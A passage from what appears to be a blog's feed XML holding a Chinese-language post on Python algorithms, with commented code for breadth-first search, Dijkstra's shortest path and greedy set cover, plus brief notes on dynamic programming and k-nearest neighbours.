把name的邻居加入搜索队列</span></span><br><span class="line">    searched=[]<span class="comment">#建立空表格，以存储一搜索过的元素</span></span><br><span class="line">    <span class="keyword">while</span> search_queue:<span class="comment">#当搜索列表不为空时</span></span><br><span class="line">        person=search_queue.popleft()<span class="comment">#出一个人</span></span><br><span class="line">        <span class="keyword">if</span> person <span class="keyword">not</span> <span class="keyword">in</span> searched:<span class="comment">#排除已检查过的，免得无限循环</span></span><br><span class="line">            <span class="keyword">if</span> person_is_seller(person):</span><br><span class="line">                print(<span class="string">"i find"</span>,person) </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                search_queue+=graph[person]<span class="comment">#把那人的邻居加入队列</span></span><br><span class="line">                searched.append(person)<span class="comment">#加入已搜索行列</span></span><br><span class="line"><span class="comment">#search("you")</span></span><br></pre></td></tr></table></figure><h2 id="狄克斯特拉算法"><a href="#狄克斯特拉算法" class="headerlink" title="狄克斯特拉算法"></a>狄克斯特拉算法</h2><p>适用于加权的有向无环图，不能有负边权</p><p>非加权图：不带权重的图；加权图：带权重的图；环：带圈的；边上的数字：权重<br>算法：</p><ol><li>找出“最便宜”的节点</li><li>更新该节点的邻居开销</li><li>重复1，2直到对每个节点都这样做了</li><li>计算最终路径</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用散列表实现图的关系</span></span><br><span class="line"><span class="comment"># 创建节点的开销表，开销是指从"起点"到该节点的权重</span></span><br><span class="line"><span class="comment">#graph:图</span></span><br><span class="line">graph = &#123;&#125;</span><br><span class="line">graph[<span class="string">"start"</span>] = &#123;&#125;</span><br><span class="line">graph[<span class="string">"start"</span>][<span class="string">"a"</span>] = <span class="number">6</span></span><br><span class="line">graph[<span class="string">"start"</span>][<span class="string">"b"</span>] = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">graph[<span class="string">"a"</span>] = &#123;&#125;</span><br><span class="line">graph[<span class="string">"a"</span>][<span class="string">"end"</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">graph[<span class="string">"b"</span>] = &#123;&#125;</span><br><span class="line">graph[<span class="string">"b"</span>][<span class="string">"a"</span>] = <span class="number">3</span></span><br><span class="line">graph[<span class="string">"b"</span>][<span class="string">"end"</span>] = <span class="number">5</span></span><br><span class="line"></span><br><span class="line">graph[<span class="string">"end"</span>] = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#cost；从父节点到该节点的开销（邻居可以直接得知，对于还不知道的用无穷表示）（不断更新）</span></span><br><span class="line">infinity = float(<span class="string">"inf"</span>)<span class="comment"># 无穷大</span></span><br><span class="line">costs = &#123;&#125;</span><br><span class="line">costs[<span class="string">"a"</span>] = <span class="number">6</span></span><br><span class="line">costs[<span class="string">"b"</span>] = <span class="number">2</span></span><br><span class="line">costs[<span class="string">"end"</span>] = infinity</span><br><span class="line"></span><br><span class="line"><span class="comment"># parents：父节点散列表</span></span><br><span class="line">parents = &#123;&#125;</span><br><span class="line">parents[<span class="string">"a"</span>] = <span class="string">"start"</span></span><br><span class="line">parents[<span class="string">"b"</span>] = <span class="string">"start"</span></span><br><span class="line">parents[<span class="string">"end"</span>] = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 已经处理过的节点，需要记录，因为对于同一个节点，不用多次处理</span></span><br><span class="line">processed = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 找到开销最小的节点</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_lowest_cost_node</span><span class="params">(costs)</span>:</span></span><br><span class="line">    <span class="comment"># 初始化数据</span></span><br><span class="line">    lowest_cost = infinity</span><br><span class="line">    lowest_cost_node = <span class="literal">None</span></span><br><span class="line">    <span class="comment"># 遍历所有节点,且该节点没有被处理</span></span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> costs :<span class="comment">#循环key</span></span><br><span class="line">        <span class="comment"># 如果当前节点的开销比已经存在的开销小，,且该节点没有被处理则更新该节点为开销最小的节点</span></span><br><span class="line">        <span class="keyword">if</span> costs[node] &lt; lowest_cost <span class="keyword">and</span> node <span class="keyword">not</span> <span class="keyword">in</span> processed:</span><br><span class="line">            lowest_cost = costs[node]</span><br><span class="line">            lowest_cost_node = node</span><br><span class="line">    <span class="keyword">return</span> lowest_cost_node</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 找到最短路径</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_shortest_path</span><span class="params">()</span>:</span></span><br><span class="line">    node = <span class="string">"end"</span></span><br><span class="line">    shortest_path = [<span class="string">"end"</span>]</span><br><span class="line">    <span class="keyword">while</span> parents[node] != <span class="string">"start"</span>:</span><br><span class="line">        shortest_path.append(parents[node])</span><br><span class="line">        node = parents[node]</span><br><span class="line">    shortest_path.append(<span class="string">"start"</span>)</span><br><span class="line">    <span class="keyword">return</span> shortest_path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 寻找加权的最短路径</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dijkstra</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 查询到目前开销最小的节点(note为目前最小开销节点)</span></span><br><span class="line">    node = find_lowest_cost_node(costs)</span><br><span class="line">    <span class="comment"># 只要有开销最小的节点就循环（这个while循环在所有节点都被处理过后结束）</span></span><br><span class="line">    <span class="keyword">while</span> node <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># 获取该节点当前开销</span></span><br><span class="line">        cost = costs[node]</span><br><span class="line">        <span class="comment"># 获取该节点相邻的节点</span></span><br><span class="line">        neighbors = graph[node]</span><br><span class="line">        <span class="comment"># 遍历当前节点的所有邻居</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> neighbors.keys():</span><br><span class="line">            <span class="comment"># 计算经过当前节点到达相邻结点的开销,即当前节点的开销加上当前节点到相邻节点的开销</span></span><br><span class="line">            new_cost = cost + neighbors[n]</span><br><span class="line">            <span class="comment"># 如果经当前节点前往该邻居更近，就更新该邻居的开销</span></span><br><span class="line">            <span class="keyword">if</span> new_cost &lt; costs[n]:</span><br><span class="line">                costs[n] = new_cost</span><br><span class="line">                <span class="comment">#同时将该邻居的父节点设置为当前节点</span></span><br><span class="line">                parents[n] = node</span><br><span class="line">        <span class="comment"># 将当前节点标记为处理过</span></span><br><span class="line">        processed.append(node)</span><br><span class="line">        <span class="comment"># 找出接下来要处理的节点，并循环</span></span><br><span class="line">        node = find_lowest_cost_node(costs)</span><br><span class="line">    <span class="comment"># 循环完毕说明所有节点都已经处理完毕</span></span><br><span class="line">    shortest_path = find_shortest_path()</span><br><span class="line">    shortest_path.reverse()</span><br><span class="line">    print(shortest_path)</span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line">dijkstra()</span><br></pre></td></tr></table></figure><h2 id="近似算法"><a href="#近似算法" class="headerlink" title="近似算法"></a>近似算法</h2><p>用于解决NP完全问题</p><p>每步都选择局部最优解，最终得到的就是全局最优解（并不是任何情况下成立）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先，创建一个列表，其中包含要覆盖的州</span></span><br><span class="line">states_needed = set([<span class="string">"mt"</span>, <span class="string">"wa"</span>, <span class="string">"or"</span>, <span class="string">"id"</span>, <span class="string">"nv"</span>, <span class="string">"ut"</span>, <span class="string">"ca"</span>, <span class="string">"az"</span>])</span><br><span class="line"><span class="comment"># 还需要有可供选择的广播台清单</span></span><br><span class="line">stations = &#123;&#125;</span><br><span class="line">stations[<span class="string">"kone"</span>] = set([<span class="string">"id"</span>, <span class="string">"nv"</span>, <span class="string">"ut"</span>])</span><br><span class="line">stations[<span class="string">"ktwo"</span>] = set([<span class="string">"wa"</span>, <span class="string">"id"</span>, <span class="string">"mt"</span>])</span><br><span class="line">stations[<span class="string">"kthree"</span>] = set([<span class="string">"or"</span>, <span class="string">"nv"</span>, <span class="string">"ca"</span>])</span><br><span class="line">stations[<span class="string">"kfour"</span>] = set([<span class="string">"nv"</span>, <span class="string">"ut"</span>])</span><br><span class="line">stations[<span class="string">"kfive"</span>] = set([<span class="string">"ca"</span>, <span class="string">"az"</span>])</span><br><span class="line"><span class="comment"># 最后，需要使用一个集合来存储最终选择的广播台</span></span><br><span class="line">final_stations = set()</span><br><span class="line"><span class="comment"># 需要遍历所有广播台，从中选择覆盖了最多的未覆盖州的广播台。</span></span><br><span class="line"><span class="keyword">while</span> states_needed:</span><br><span class="line">    best_station = <span class="literal">None</span> <span class="comment"># 覆盖了最多的未覆盖州的广播台</span></span><br><span class="line">    states_covered = set() <span class="comment"># 包含该广播台覆盖的所有未覆盖的州</span></span><br><span class="line">    <span class="keyword">for</span> station, states_for_station <span class="keyword">in</span> stations.items():</span><br><span class="line">        covered = states_needed &amp; states_for_station  <span class="comment"># 计算交集</span></span><br><span class="line">        <span class="keyword">if</span> len(covered) &gt; len(states_covered):</span><br><span class="line">            best_station = station</span><br><span class="line">            states_covered = covered</span><br><span class="line">    states_needed -= states_covered</span><br><span class="line">    final_stations.add(best_station)</span><br><span class="line">print(final_stations)</span><br></pre></td></tr></table></figure><h2 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h2><p>网格，单元格中的值通常是要优化的值</p><p>要确定:</p><ol><li>单元格的值是什么</li><li>如何将这个问题划分为子问题</li><li>网格的坐标轴是什么</li></ol><h2 id="k最邻近算法"><a href="#k最邻近算法" class="headerlink" title="k最邻近算法"></a>k最邻近算法</h2><p>k-nearest-neighbours,KNN</p><p>基本工作</p><ol><li>分类（边组）</li><li>回归（预测数值）</li><li>特征抽取（将物品转换成一系列可比较的数字）</li></ol><p>应用：机器学习（OCR）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;python算法集合&quot;&gt;&lt;a href=&quot;#python算法集合&quot; class=&quot;headerlink&quot; title=&quot;python算法集合&quot;&gt;&lt;/a&gt;python算法集合&lt;/h1&gt;&lt;h2 id=&quot;数据结构&quot;&gt;&lt;a href=&quot;#数据结构&quot; class=&quot;head
      
    
    </summary>
    
    
      <category term="python" scheme="https://mercer5.github.io/categories/python/"/>
    
    
      <category term="算法" scheme="https://mercer5.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="python" scheme="https://mercer5.github.io/tags/python/"/>
    
  </entry>
  
</feed>
